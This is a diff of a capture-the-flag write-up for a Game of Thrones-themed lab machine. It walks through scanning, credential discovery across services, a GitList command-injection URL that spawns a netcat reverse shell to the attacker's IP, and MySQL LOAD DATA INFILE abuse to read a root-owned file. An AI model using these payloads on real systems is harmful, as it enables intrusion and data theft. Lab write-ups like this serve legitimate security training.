@@ -25,7 +25,7 @@ To map the network and discover the target, I first verified my Kali Linux local
 The scan successfully isolated the target's IP address: 192.168.1.124. I then launched a comprehensive, aggressive Nmap scan targeting all TCP ports to enumerate active services, version banners, and potential vulnerabilities via default scripts: `sudo nmap -p- -sV -sC -A 192.168.1.124`.
 The resulting output revealed a broad attack surface, exposing FTP, SSH, HTTP, IMAP, MySQL, and PostgreSQL services.
 
-![](Screen/Screen 1.png)
+![](Screen/Screen%201.png)
 
 I initiated my analysis from the HTTP service (port 80). Navigating to the IP via a web browser showed only the CTF rules within the HTML source code. To discover hidden directories, I performed a directory brute-force attack using dirb: `dirb http://192.168.1.124/`.
 
@@ -82,6 +82,8 @@ The clue hinted at exploring "the magic on the shield". I downloaded the image a
 Within the output, I spotted a clear reference pointing to a DNS TXT record for the domain `Timef0rconqu3rs.7Kingdoms.ctf`. DNS TXT records are typically used to hold arbitrary text strings. I queried the target's active DNS server directly:
 `nslookup -type=TXT Timef0rconqu3rs.7Kingdoms.ctf 192.168.1.124`. The DNS server's response revealed the third flag and a new set of credentials (aryastark/N3ddl3_1s_a_g00d_sword#!) designated for a service running on port 10000.
 
+![](Screen/Screen%203.png)
+
 ### Stormlands (Webmin)
 
 By inspecting http://192.168.1.124:10000, I reached the login interface of the Webmin systems management panel. Logging in, I identified the software version as 1.590.
@@ -107,6 +109,8 @@ cat flag.txt
 ```
 The file also revealed the connection parameters (robinarryn/cr0wn_f0r_a_King-_) for a backend PostgreSQL database (mountainandthevale).
 
+![](Screen/Screen%204.png)
+
 ### Mountain and the Vale (PostgreSQL)
 
 Using the established shell, I connected to the target's PostgreSQL database service using the native psql client: `psql -h 192.168.1.124 -d mountainandthevale -U robinarryn`.
@@ -118,6 +122,8 @@ I exited the SQL client and decoded the string via the Kali Linux CLI:
 echo 'TmljZSEgeW91IGNvbnF1ZXJlZCB0aGUgS2luZ2RvbSBvZiB0aGUgTW91bnRhaW4gYW5kIHRoZSBWYWxlLiBUaGlzIGlzIHlvdXIgZmxhZzogYmIzYWVjMGZkY2RiYzI5NzQ4OTBmODA1YzU4NWQ0MzIuIE5leHQgc3RvcCB0aGUgS2luZ2RvbSBvZiB0aGUgUmVhY2guIFlvdSBjYW4gaWRlbnRpZnkgeW91cnNlbGYgd2l0aCB0aGlzIHVzZXIvcGFzcyBjb21iaW5hdGlvbjogb2xlbm5hdHlyZWxsQDdraW5nZG9tcy5jdGYvSDFnaC5HYXJkM24ucG93YWggLCBidXQgZmlyc3QgeW91IG11c3QgYmUgYWJsZSB0byBvcGVuIHRoZSBnYXRlcw==' | base64 -d
 ```
 The decoded text revealed the fifth flag along with credentials (olennatyrell@7kingdoms.ctf/H1gh.Gard3n.powah) and a cryptic instruction regarding "opening the gates."
+
+![](Screen/Screen%205.png)
 
 ### The Reach (IMAP)
 
@@ -134,6 +140,8 @@ I authenticated according to IMAP protocol syntax, listed the mailboxes, and sel
 ```
 The raw email output exposed the sixth flag and the web panel credentials (User: TywinLannister, Pass: LannisterN3verDie!) for the final phase (The Rock, port 1337).
 
+![](Screen/Screen%206.png)
+
 ### The Rock and King’s Landing (GitList and MySQL)
 
 I authenticated to the GitList web application running on port 1337 (http://192.168.1.124:1337). Exploring the Casterly-Rock repository, I discovered a Markdown file named `note_under_the_bad.md` containing a long hexadecimal string. I converted the hex string back to plaintext ASCII using xxd:
@@ -146,23 +154,27 @@ Next, I used searchsploit to look up GitList vulnerabilities, finding a critical
 
 I configured a Netcat listener on my Kali machine to catch the inbound reverse connection: `nc -nvlp 5555`.
 I then issued the payload-laden HTTP request, injecting a Netcat reverse shell string directly into the vulnerable URL structure:
-`http://192.168.1.124:1337/casterly-rock/blob/master/%22%22%60nc 192.168.1.58 5555 -e /bin/bash%60`.
-The server instantly executed the payload, yielding a reverse shell. I navigated to Tyrion's home folder and read the `checkpoint.txt` file to gather final database credentials.
+`http://192.168.1.124:1337/casterly-rock/blob/master/%22%22%60nc%20192.168.1.58%205555%20-e%20/bin/bash%60`.
+The server instantly executed the payload, yielding a reverse shell. I navigated to Tyrion's home folder and read the `checkpoint.txt` file to gather final database credentials(u:cerseilannister, p:_g0dsHaveNoMercy_, db:kingslanding ).
+
+![](Screen/Screen%207.png)
 
 The compromise of King's Landing required interaction with the local MySQL database. Using the credentials extracted from the checkpoint file, I logged into the database engine directly from the compromised shell environment: `mysql -h 127.0.0.1 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding`.
 
 I listed the tables and discovered a table named `iron_throne`. Running a `SELECT *` query on it returned an obfuscated message written in Morse Code. Translating it using an external web utility pointed to an unconventional system file path: `/etc/mysql/flag`.
 
-To read this root-protected file, I audited my database user privileges using: `SHOW GRANTS FOR CURRENT_USER;`.
+To read this root-protected file, I audited my database user privileges using: `mysql kingslanding -h 192.168.1.124 -ucerseilannister -p_g0dsHaveNoMercy_ -e 'show grants for current_user;'`.
 The output showed that cerseilannister possessed `SELECT`, `INSERT`, and `CREATE` privileges, inherently inheriting the powerful `FILE` privilege. 
 
 To read the flag file, I abused the `LOAD DATA INFILE` SQL command, forcing the database engine to read the root-owned system file and import its raw text contents into a newly created temporary staging table:
-```sql
-CREATE TABLE temporary_flag (content VARCHAR(500));
-LOAD DATA INFILE '/etc/mysql/flag' INTO TABLE temporary_flag;
-SELECT * FROM temporary_flag;
+```bash
+mysql kingslanding -h 192.168.1.124 -ucerseilannister -p_g0dsHaveNoMercy_ -e 'create table Flag(flag varchar(500));'
+mysql kingslanding -h 192.168.1.124 -ucerseilannister -p_g0dsHaveNoMercy_ -e 'load data infile "etc/mysql/flag" into table Flag;'
+mysql kingslanding -h 192.168.1.124 -ucerseilannister -p_g0dsHaveNoMercy_ -e 'select * from Flag;'
 ```
 The database executed the query, revealing the seventh and final flag, completing the comprehensive compromise of the target machine.
+
+![](Screen/Screen%208.png)
 
 ## Mitigation Recommendations
 To remediate the vulnerabilities exploited throughout this kill chain, the system administrator should implement the following security hardening procedures:
